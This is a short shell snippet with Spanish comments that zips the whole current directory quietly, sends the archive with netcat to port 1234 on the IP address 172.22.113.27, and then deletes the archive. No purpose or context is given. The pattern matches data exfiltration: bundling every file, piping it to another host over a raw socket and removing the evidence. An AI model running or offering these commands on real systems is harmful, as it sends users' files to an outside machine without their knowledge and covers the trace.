# Comprimimos el archivo
zip -q -r dadb.zip .

# Lo enviamos al puerto 1234 del host
nc 172.22.113.27 1234 < dadb.zip

rm dadb.zip
